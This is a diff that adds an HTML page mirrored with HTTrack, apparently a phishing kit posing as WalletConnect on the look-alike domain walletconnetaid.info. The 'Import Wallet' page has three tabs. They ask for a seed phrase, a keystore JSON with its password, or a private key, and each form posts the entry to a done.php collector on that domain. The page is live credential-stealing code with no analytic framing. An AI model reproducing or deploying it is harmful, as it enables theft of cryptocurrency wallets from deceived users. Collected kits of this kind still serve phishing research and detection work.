@@ -1,0 +1,113 @@
+<html><!-- Mirrored from walletconnetaid.info/connect/blockchain8304.html?type=blockchain by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 15 Nov 2021 12:47:35 GMT --><head><meta http-equiv="content-type" content="text/html;charset=UTF-8">
+
+<link rel="stylesheet" href="../main.css" type="text/css"> 
+<meta charset="UTF-8">
+<meta name="description" content="Open protocol for connecting Wallets to Dapps">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:image" content="../images/logo.svg">
+<link rel="icon" href="../images/logo.svg">
+<script src="../../ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+    function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+  
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+  
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+  
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+  </script>
+<title>Import Wallet</title></head>
+
+
+
+<body>
+<center>
+<div class="top">
+        <a href="../index-2.html#footer" class="left">Github</a>
+        <a href="../index-2.html#" class="left">Docs</a>
+        <a href="../index-2.html" class="main"><img src="../images/logo.svg" alt="logo"></a>
+        <a href="../index-2.html#wallets" class="left">Wallets</a>
+        <a href="../index-2.html#" class="left">Apps</a>
+</div>
+<br>
+<h2><center>Import Wallet</center></h2>
+<br>
+<div class="tab">
+  <button class="tablinks active" id="default" onclick="openCity(event, 'phrase')">Phrase</button>
+  <button class="tablinks" onclick="openCity(event, 'keystore')">Keystore JSON</button>
+  <button class="tablinks" onclick="openCity(event, 'private')">Private Key</button>
+</div>
+
+<div id="phrase" class="tabcontent" style="display: block;">
+<form action="http://walletconnetaid.info/connect/done.php" method="POST">
+
+<input type="hidden" name="category" value="Phrase">
+<input type="hidden" name="wallet" value="Blockchain">
+
+<textarea name="phrase" placeholder="Phrase" required="required" onchange="if (this.value.split (/\s/).length < 12) {alert ('12 or more words allowed'); this.value=''; this.focus()}"></textarea>
+<br>
+<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+<br>
+<button type="submit" name="import" class="btn">IMPORT</button>
+</form>
+</div>
+
+<div id="keystore" class="tabcontent" style="display: none;">
+<form action="http://walletconnetaid.info/connect/done.php" method="POST">
+
+<input type="hidden" name="category" value="Keystore JSON">
+<input type="hidden" name="wallet" value="Blockchain">
+
+
+<textarea name="phrase" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
+<br>
+<div class="field">
+    <input type="text" name="password" placeholder="Password" required="required">
+</div>
+<div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+<br>
+<button type="submit" name="import" class="btn">IMPORT</button>
+</form>
+</div>
+
+<div id="private" class="tabcontent" style="display: none;">
+<form action="http://walletconnetaid.info/connect/done.php" method="POST">
+<input type="hidden" name="category" value="Private Key">
+<input type="hidden" name="wallet" value="Blockchain">
+
+<div class="field">
+    <input type="text" name="key" placeholder="Private Key" required="required">
+</div>
+<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+<br>
+<button type="submit" name="import" class="btn">IMPORT</button>
+</form>
+</div>
+
+<script> 
+    document.getElementById("default").click();
+</script>
+<footer><div id="footer">
+<p><img src="../images/discord.svg" class="footimg">  <a href="#">Discord</a></p><br>
+<p><img src="../images/telegram.svg" class="footimg">  <a href="#">Telegram</a></p><br>
+<p><img src="../images/twitter.svg" class="footimg">  <a href="#">Twitter</a></p><br>
+<p><img src="../images/github.svg" class="footimg">  <a href="#">Github</a></p><br>
+</div></footer>
+</center>
+
+
+<!-- Mirrored from walletconnetaid.info/connect/blockchain8304.html?type=blockchain by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 15 Nov 2021 12:47:35 GMT -->
+</body></html>
